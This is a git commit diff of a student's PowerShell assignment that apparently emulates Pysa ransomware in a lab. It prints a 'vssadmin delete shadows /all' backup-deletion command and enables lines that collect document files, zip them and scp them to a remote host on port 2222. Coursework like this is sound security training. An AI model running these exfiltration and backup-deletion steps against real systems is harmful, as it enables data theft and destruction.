a4173cee48d3b84c474c585e3f460dabf6d0aec5
Asani Vessup <Ornateshelf5097@gmail.com>
2022-04-27 14:37:34 -0700

    Week13 Work

--- Week13/Assignment/Almost_Completing_Pysa.ps1
+++ Week13/Assignment/Almost_Completing_Pysa.ps1
@@ -12,25 +12,25 @@ Write-Output "vssadmin delete shadows /all"
 # files and copy those to a new folder of your choice.  Zip the folder containing the files using the Powershell cmdlet.  
 # Use Powershell to scp the zipped file over to 192.168.6.71 port 2222.
 
-#Expand-Archive .\Documents.zip
+Expand-Archive .\Documents.zip
 
 # Search Documents Folder for docx, xlsx, pdf, and txt files and move those to a the FIleSystem folder
 
-#Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\Documents | `
-#Move-Item -Destination C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem
+Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\Documents | `
+Move-Item -Destination C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem
 
 # Compress files found into folder named FileSystem
 
-#Compress-Archive -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem -DestinationPath `
-#C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem_Zip
+Compress-Archive -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem -DestinationPath `
+C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem_Zip
 
 # Export found files into csv
 
-#Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem | Export-CSV -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem.csv
+Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem | Export-CSV -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem.csv
 
-#Install-Module -Name Posh-SSH
+Install-Module -Name Posh-SSH
 
 # Move zip file to remote host
 
-#Set-SCPItem -Computername '192.168.6.71' -Port 2222 -Credential (Get-Credential asani.vessup) `
-#-Destination '/home/asani.vessup' -Path 'C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem_Zip.zip'
+Set-SCPItem -Computername '192.168.6.71' -Port 2222 -Credential (Get-Credential asani.vessup) `
+-Destination '/home/asani.vessup' -Path 'C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem_Zip.zip'
